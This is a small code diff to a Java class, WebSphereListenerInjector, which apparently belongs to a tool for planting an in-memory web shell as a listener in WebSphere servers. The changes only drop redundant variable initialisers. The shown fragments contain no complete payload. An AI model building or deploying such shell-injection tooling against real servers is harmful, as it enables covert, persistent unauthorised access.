@@ -17,7 +17,7 @@ public class WebSphereListenerInjector {
 
     private static String shellClassName;
     private static String shellClass;
-    private static boolean ok = false;
+    private static boolean ok;
 
     public WebSphereListenerInjector() {
         if (ok) {
@@ -97,7 +97,7 @@ public class WebSphereListenerInjector {
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz = null;
+        Class<?> clazz;
         try {
             clazz = classLoader.loadClass(shellClassName);
         } catch (Exception e) {
